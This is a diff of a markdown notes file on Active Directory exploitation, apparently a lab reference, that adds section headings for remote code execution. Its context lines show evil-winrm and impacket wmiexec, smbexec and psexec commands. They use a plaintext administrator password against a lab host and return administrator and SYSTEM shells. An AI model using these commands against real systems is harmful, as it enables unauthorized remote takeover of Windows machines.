@@ -12,7 +12,10 @@ This is a collection of notes about active directory and (post)exploitation
   * [AS-REP Roasting](#as-rep-roasting)
   * [Kerberoasting](#kerberoasting)
 - [Remote Code Execution](#remote-code-execution)
+  * [Evil-WinRM](#evil-winrm)
   * [Impacket](#impacket)
+  * [smbexec](#smbexec)
+  * [psexec](#psexec)
 - [Post-Exploitation](#post-exploitation)
   * [Golden Ticket](#golden-ticket)
   * [Machine Domain admin (Use machine NTLM hash)](#machine-domain-admin--use-machine-ntlm-hash-)
@@ -363,7 +366,7 @@ Crack with hashcat
 
 # Remote Code Execution
 
-Evil-WinRM
+## Evil-WinRM
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ evil-winrm -i 192.168.200.100 -u administrator -p Pass123!                                                                                     1 ⚙
@@ -390,8 +393,6 @@ Evil-WinRM
 
 ## Impacket
 
-wmiexec
-
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-wmiexec valhalla/administrator:Pass123\!@192.168.200.100                                                                 1 ⨯ 1 ⚙
 	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -402,7 +403,7 @@ wmiexec
 	C:\>whoami
 	valhalla\administrator
 
-smbexec
+## smbexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-smbexec valhalla/administrator:Pass123\!@192.168.200.100                                                                     1 ⚙
@@ -413,7 +414,7 @@ smbexec
 	nt authority\system
 
 
-psexec
+## psexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-psexec valhalla/administrator:Pass123\!@192.168.200.100                                                                  1 ⨯ 1 ⚙
